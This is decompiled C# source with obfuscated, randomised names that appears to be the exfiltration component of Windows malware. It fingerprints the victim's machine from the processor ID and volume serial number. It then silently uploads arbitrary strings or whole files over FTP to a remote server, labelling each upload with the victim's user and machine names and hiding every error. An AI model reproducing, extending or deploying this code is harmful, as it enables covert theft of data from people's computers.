using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace WvdSzXINIqX;

internal sealed class CmYAejDgYJsctGHm
{
	public static string tGhpPKuyPxdeK()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = "C";
			ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? "" : text;
		}
	}

	public static void wKTHnKvpbQDn(string tSieiUygsSoT = "URL", string TjsRrUijsmOl = "USERNAME", string WDrImoJHoSf = "ACCESO", string cBylOUgcxcF = "")
	{
		try
		{
			string text = tGhpPKuyPxdeK();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(tSieiUygsSoT + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(TjsRrUijsmOl, WDrImoJHoSf);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(cBylOUgcxcF);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void cAQIzFscohI(string QDkLWMlMVmfm = "URL", string MdnvughXqtY = "USERNAME", string pziBDogCThatAF = "ACCESO", string xfddojssNXiIJn = "")
	{
		try
		{
			string text = tGhpPKuyPxdeK();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(QDkLWMlMVmfm + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(xfddojssNXiIJn));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(MdnvughXqtY, pziBDogCThatAF);
			byte[] array = File.ReadAllBytes(xfddojssNXiIJn);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
